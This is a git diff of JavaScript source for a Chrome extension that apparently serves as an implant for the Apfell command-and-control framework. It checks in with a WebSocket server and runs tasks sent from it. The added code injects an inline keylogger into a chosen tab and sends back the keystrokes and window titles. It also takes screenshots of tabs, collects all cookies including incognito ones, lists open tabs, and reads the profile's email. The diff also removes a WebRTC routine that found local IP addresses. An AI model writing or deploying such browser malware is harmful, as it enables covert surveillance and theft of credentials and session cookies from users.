@@ -12,17 +12,15 @@ class SporeConfiguration {
         }
 
         this.apfellID = 0;
-        this.username = chrome.identity.getProfileUserInfo(function(userinfo){
-            return userinfo.email;
-        });
+        this.username = chrome.identity.AccountInfo;
         this.pid = 0;
-        this.hostname = chrome.instanceID.getID();
+        this.hostname = "chrome";
         this.UUID = uuid;
         // TODO: Add properties for the RSA and AES keys
     }
 }
 
-const config = new SporeConfiguration("Unique Identifier", "localhost", "websocket", 454, true);
+const config = new SporeConfiguration("480s9sdf09sf9sdjfskdlaskdfjlasdf", "localhost", "websocket", 443, true);
 // Connect to the server
 const connection = new WebSocket(config.serverurl);
 let out = [];
@@ -34,12 +32,12 @@ let keyloggers = [];
 
 /// Create a Callback Checkin Message
 function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
-    const msg = {};
+    let msg = {};
     msg.user = username;
-    msg.processid = pid;
+    msg.pid = pid;
     msg.uuid = uuid;
-    msg.addresses = addresses;
-    msg.hostname = hostname;
+    msg.ip = addresses;
+    msg.host = hostname;
 
     return msg;
 }
@@ -55,31 +53,6 @@ function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data)
     msg.data =  data;
 
     return msg;
-}
-/// Get the local IP addresses
-function GetLocalIP(options) {
-    const ips = [];
-    const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-
-    const pc = new RTCPeerConnection({
-        iceServers : []
-    });
-
-    pc.createDataChannel('');
-    pc.onicecandidate = function(e) {
-        if (!e.candidate) {
-            pc.close();
-            callback(ips);
-        }
-        const ip = /^candidate:.+ (\S+) \d+ typ/.exec(e.candidate.candidate)[1];
-        if (ips.indexOf(ip) === -1)
-            ips.push(ip);
-    };
-
-    pc.createOffer(function (sdp) {
-        pc.setLocalDescription(sdp);
-    }, function onerror() {
-    });
 }
 /// Convert a base64 string to data array
 function base64StringToDataArray(data) {
@@ -118,34 +91,24 @@ setInterval(function(){
     }
 }, 5000);
 
-// TODO: Add helper functions to create Key Exchange, Callback Checkin, and Apfell Task Request messages
-
 (function(){
     // Main function
     /// Receives and processes messages
     // Add a new listener to continually retrieve messages
-    chrome.runtime.onMessage.addListener(function(message, sender, callback) {
+    chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
         // Listen for events from other scripts
         switch (message.type) {
-            case 'keylogInit' : {
-                keyloggers.push(sender.tab.id);
-                break;
-            }
-            case 'keylogExit' : {
-                const index = keyloggers.indexOf(sender.tab.id);
-                if (index !== -1) keyloggers.splice(index, 1);
-                break;
-            }
-            case 'keylogData' : {
+            case 'keylogger' : {
                 const keydata = {};
-                keydata.user = config.username;
-                keydata.keystrokes = message.data;
-                let payload = btoa(JSON.stringify(keydata));
+                keydata["user"] = config.username;
+                keydata["keystrokes"] = message.data;
+                keydata['window_title'] = message.window;
+                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(keydata))));
                 let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
                 const meta = {};
                 meta.type = 3;
                 meta.metadata = envelope;
-                const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                const metaenvelope = JSON.stringify(meta);
                 out.push(metaenvelope);
                 break;
             }
@@ -153,28 +116,31 @@ setInterval(function(){
                 const formData = {};
                 formData.user = config.username;
                 formData.keystrokes = message.data;
-                let payload = btoa(JSON.stringify(formData));
+                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(formData))));
                 let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
                 const meta = {};
                 meta.type = 3;
                 meta.metadata = envelope;
-                const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                const metaenvelope = JSON.stringify(meta);
                 out.push(metaenvelope);
                 break;
             }
         }
+
+        sendResponse({});
     });
     
     connection.onopen = function() {
         // Send the checkin data
-        const localAddresses = GetLocalIP();
+        const localAddresses = "127.0.0.1";
         const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses, config.hostname);
-        const envelope = JSON.stringify(checkInMessage, null, 2);
+        //const envelope = JSON.stringify(checkInMessage);
         const meta = {};
-        meta.type = 2;
-        meta.metadata = envelope;
-        const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+        meta["metatype"] = 2;
+        meta["metadata"] = checkInMessage;
+        const metaenvelope = JSON.stringify(meta);
         connection.send(metaenvelope);
+        console.log('Sent initial checkin');
     };
     
     connection.onclose = function(){
@@ -188,7 +154,7 @@ setInterval(function(){
     // handle messages from other events
     connection.onmessage = function (e) {
 
-        const message = JSON.parse(atob(e.data));
+        const message = JSON.parse(e.data);
         
         switch (message["metatype"]) {
             case 2 : {
@@ -208,44 +174,32 @@ setInterval(function(){
                     // Screenshot
                     chrome.tabs.captureVisibleTab(null, function(img) {
                         // send back the base64encoded image
-                        const encodedImage = btoa(unescape(encodeURIComponent(img.toString())));
-                        const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encodedImage.length, taskid, tasktype, encodedImage);
-                        const envelope = JSON.stringify(apfellmsg, null, 2);
-                        const meta = {};
-                        meta.type = 3;
-                        meta.metadata = envelope;
-                        const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                        //console.log('Image '+img.toString());
+                        let encImg = img.toString().split(',')[1];
+                        const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
+                        let meta = {};
+                        meta["metatype"] = 3;
+                        meta["metadata"] = apfellmsg;
+                        const metaenvelope = JSON.stringify(meta);
                         out.push(metaenvelope);
                     });
                 } else if (tasktype === 2) {
                     // Keylog
-                    const queryInfo = {};
+                    let id = Math.round(parseInt(atob(data['data'])));
                     keylogTaskID = taskid;
-
-                    // Set capture forms to true
-                    chrome.storage.local.set({'formGrabber': true});
-
-                    // Inject the keylogger script into every tab
-                    chrome.tabs.query(queryInfo, function(result) {
-                        for (i = 0; i < result.length; i++) {
-                            let ind = keyloggers.indexOf(result[i].id);
-                            if (ind === -1) {
-                                // Only inject the keylogger if it isn't already running
-                                chrome.tabs.executeScript(result[i].id, {
-                                    file: "src/bg/keylogger.js"
-                                });
-                            }
-                        }
+                    let kl_js = 'let keys={};keys.type=\'keylogger\';keys.window=document.title;keys.data=\'\';document.onkeypress = function(e){get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys.data+=key;};setInterval(function(){if(keys.data.length != 0){chrome.runtime.sendMessage(keys);keys.data=\'\';}}, 10000);';
+                    // Inject the keylogger script into tab id
+                    chrome.tabs.executeScript(id, {
+                        code: kl_js
                     });
 
 
-                    const started = btoa(JSON.stringify({'status': 'started'}));
+                    const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
                     const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
-                    const envelope = JSON.stringify(apfellmsg, null, 2);
-                    const meta = {};
-                    meta.type = 3;
-                    meta.metadata = envelope;
-                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                    let meta = {};
+                    meta["metatype"] = 3;
+                    meta["metadata"] = apfellmsg;
+                    const metaenvelope = JSON.stringify(meta);
                     out.push(metaenvelope);
                 } else if (tasktype === 3) {
                     // Get all cookies. Includes incognito cookies
@@ -255,18 +209,18 @@ setInterval(function(){
                             const filter = {};
                             filter["storeId"] = store.id;
                             chrome.cookies.getAll({"storeId": store.id}, function(cookies){
-                                results = results.concat(cookies);
+                                const data = btoa(JSON.stringify(cookies));
+                                const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                                let meta = {};
+                                meta["metatype"] = 3;
+                                meta["metadata"] = apfellmsg;
+                                const metaenvelope = JSON.stringify(meta);
+                                out.push(metaenvelope);
                             });
                         });
                     });
 
-                    const data = btoa(JSON.stringify(results, null, 2));
-                    const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
-                    const meta = {};
-                    meta.type = 3;
-                    meta.metadata = envelope;
-                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
-                    out.push(metaenvelope);
+
 
                 } else if (tasktype === 4) {
                     // TODO: Implement task code for setting a cookie value
@@ -287,15 +241,26 @@ setInterval(function(){
 
                             tabs.push(individualTab);
                         }
+                        const data = btoa(unescape(encodeURIComponent(JSON.stringify(tabs))));
+                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                        let meta = {};
+                        meta["metatype"] = 3;
+                        meta["metadata"] = apfellMsg;
+                        const metaenvelope = JSON.stringify(meta);
+                        out.push(metaenvelope);
                     });
 
-                    const data = btoa(JSON.stringify(tabs, null, 2));
-                    const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
-                    const meta = {};
-                    meta.type = 3;
-                    meta.metadata = envelope;
-                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
-                    out.push(metaenvelope);
+
+                } else if (tasktype === 6) {
+                    chrome.identity.getProfileUserInfo(function(info){
+                        const data = btoa(unescape(encodeURIComponent((info.email))));
+                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                        let meta = {};
+                        meta["metatype"] = 3;
+                        meta["metadata"] = apfellMsg;
+                        const metaenvelope = JSON.stringify(meta);
+                        out.push(metaenvelope);
+                    });
                 }
             }
         }
